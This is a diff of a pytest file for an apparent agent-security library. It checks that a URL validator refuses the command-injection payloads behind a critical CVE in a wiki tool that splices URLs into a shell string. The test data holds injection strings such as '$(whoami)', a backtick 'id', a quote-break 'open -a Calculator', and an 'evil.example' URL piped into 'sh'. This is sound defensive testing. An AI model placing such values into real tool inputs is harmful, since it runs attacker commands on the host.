@@ -18,19 +18,19 @@ Fix:      https://github.com/zosmaai/pi-llm-wiki/commit/360867034e79175b45c8e04a
 NVD:      https://nvd.nist.gov/vuln/detail/CVE-2026-102911
 CVSS:     9.9 (CRITICAL) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, CWE-77 + CWE-78
 
-Airlock fit: none.
-    In scope and not refused yet: dispositioned
-    ``in-scope-and-deferred-until-2026-11-02`` on issue #256. A ``url`` typed ``SafeURL``
-    refuses the published payload, but only because it is not an https URL at all.
-    Put the same payload inside one and ``SafeURL`` admits it, because it checks where
-    a URL points (scheme, host, metadata endpoints, private ranges), not which
-    characters it carries. ``StdioCommandInjectionGuard`` does refuse these characters,
-    but it reads only the ``command`` and ``args`` fields of a spawn config, never an
-    argument named ``url``.
+Airlock fit: partial.
+    A ``url`` typed ``SafeURL`` refuses every payload here that runs a command through the
+    double-quoted splice. Upstream's own payloads are not https URLs, so the scheme check
+    refuses them. Put inside one, each still carries a ``"`` that ends the quoting, a
+    backtick, a ``|`` or ``$(``, and since 0.10.22 ``SafeURL`` refuses a URL carrying a
+    character RFC 3986 requires to be percent-encoded, and ``$(``. Until then it checked
+    only where a URL points, and these four cases were held here as strict ``xfail``
+    (issue #256).
 
-    The tests that want the refusal are strict ``xfail``. The day a primitive starts
-    refusing a URL that carries shell syntax they fail the build, and this fit and the
-    disposition on #256 have to change with them.
+    What it cannot refuse: ``$NAME`` inside the double quotes still expands, so a URL can
+    carry an environment variable into the fetch. ``$name`` is ordinary URL syntax
+    (OData's ``$select``), and refusing it would break real URLs. The complete fix is the
+    upstream one: pass the URL as its own argv element, with no shell.
 """
 
 from __future__ import annotations
@@ -39,10 +39,6 @@ import pytest
 from scripts.cve_watcher import classify_shape
 
 from agent_airlock import Airlock, SafeURL
-from agent_airlock.mcp_spec.stdio_command_injection_guard import (
-    StdioCommandInjectionGuard,
-    StdioCommandInjectionVerdict,
-)
 from agent_airlock.self_heal import BlockReason
 
 CVE = "CVE-2026-102911"
@@ -74,23 +70,19 @@ UPSTREAM_PAYLOADS = (
     "x\n echo hacked",
 )
 
-#: The same attack inside a well-formed https URL. Each still runs a command once it
-#: is spliced into the vulnerable ``sh -c`` string: substitution runs inside double
-#: quotes, and ``;`` and ``|`` run after a ``"`` has closed them.
+#: The same attack inside a well-formed https URL, with the part of SafeURL's refusal
+#: that names it. Each still runs a command once spliced into the vulnerable ``sh -c``
+#: string: substitution runs inside double quotes, and ``;`` and ``|`` run after a ``"``
+#: has closed them.
 URL_PAYLOADS = (
-    ("quote break then semicolon", 'https://example.com/";open -a Calculator;# '),
-    ("dollar-paren substitution", "https://example.com/$(whoami)"),
-    ("backtick substitution", "https://example.com/`id`"),
-    ("quote break then pipe", 'https://evil.example/run.md"|sh #'),
-)
-
-DEFERRED = pytest.mark.xfail(
-    strict=True,
-    raises=AssertionError,
-    reason=(
-        "in-scope-and-deferred-until-2026-11-02 (#256): SafeURL checks where a URL "
-        "points, not which characters it carries"
+    (
+        "quote break then semicolon",
+        'https://example.com/";open -a Calculator;# ',
+        "must be percent-encoded",
     ),
+    ("dollar-paren substitution", "https://example.com/$(whoami)", "shell command substitution"),
+    ("backtick substitution", "https://example.com/`id`", "must be percent-encoded"),
+    ("quote break then pipe", 'https://evil.example/run.md"|sh #', "must be percent-encoded"),
 )
 
 
@@ -100,12 +92,11 @@ def wiki_capture_source(url: SafeURL) -> str:
     return "captured"
 
 
-class TestThePublishedPayloadIsRefusedForTheWrongReason:
-    """Upstream's payloads are refused, by the scheme check.
+class TestThePublishedPayloadIsRefusedByTheSchemeCheck:
+    """Upstream's payloads are refused before anything else is looked at.
 
-    None of them is an https URL, so ``SafeURL`` refuses each one before it looks at
-    anything else. That is a refusal, and it is not metacharacter detection, which is
-    what the next class shows.
+    None of them is an https URL, so the scheme check refuses each one. That alone was
+    never metacharacter detection, which is why the next class exists.
     """
 
     @pytest.mark.parametrize("payload", UPSTREAM_PAYLOADS)
@@ -117,28 +108,29 @@ class TestThePublishedPayloadIsRefusedForTheWrongReason:
 
 
 class TestTheSamePayloadInsideAUrl:
-    """What the deferral is about: strict ``xfail`` until a primitive refuses these."""
+    """Strict ``xfail`` until 0.10.22, when ``SafeURL`` started reading characters (#256)."""
 
-    @DEFERRED
-    @pytest.mark.parametrize(("label", "url"), URL_PAYLOADS, ids=[p[0] for p in URL_PAYLOADS])
-    def test_it_is_refused(self, label: str, url: str) -> None:
+    @pytest.mark.parametrize(
+        ("label", "url", "why"), URL_PAYLOADS, ids=[p[0] for p in URL_PAYLOADS]
+    )
+    def test_it_is_refused(self, label: str, url: str, why: str) -> None:
         result = wiki_capture_source(url=url)
+
         assert isinstance(result, dict), f"{label}: SafeURL admitted {url!r}"
+        assert result["block_reason"] == BlockReason.VALIDATION_ERROR.value
+        assert why in result["error"]
 
 
-class TestWhereTheGapIs:
-    """Which primitive would have to change, pinned rather than asserted in prose."""
+class TestScopeBoundary:
+    """What ``SafeURL`` still lets through, and why that is the right line."""
 
-    def test_the_metachar_guard_knows_the_payload_and_never_reads_url(self) -> None:
-        url = URL_PAYLOADS[0][1]
-        guard = StdioCommandInjectionGuard()
+    def test_a_dollar_name_still_passes_because_urls_use_it(self) -> None:
+        # OData and Microsoft Graph put `$select`, `$top` and `$filter` in real URLs, so
+        # `$name` cannot be refused. The cost: inside the vulnerable double quotes
+        # `$NAME` would still expand an environment variable into the fetch.
+        url = "https://graph.microsoft.com/v1.0/users?$select=displayName&$top=5"
 
-        # Placed where the guard reads, the same string is refused...
-        in_argv = guard.evaluate({"command": "uvx", "args": ["markitdown", url]})
-        assert in_argv.verdict is StdioCommandInjectionVerdict.DENY_SHELL_METACHAR
-
-        # ...and as the tool's own argument it is not looked at.
-        assert guard.evaluate({"url": url}).allowed is True
+        assert wiki_capture_source(url=url) == "captured"
 
     def test_a_plain_capture_url_still_reaches_the_tool(self) -> None:
         assert wiki_capture_source(url="https://example.com/page.html") == "captured"
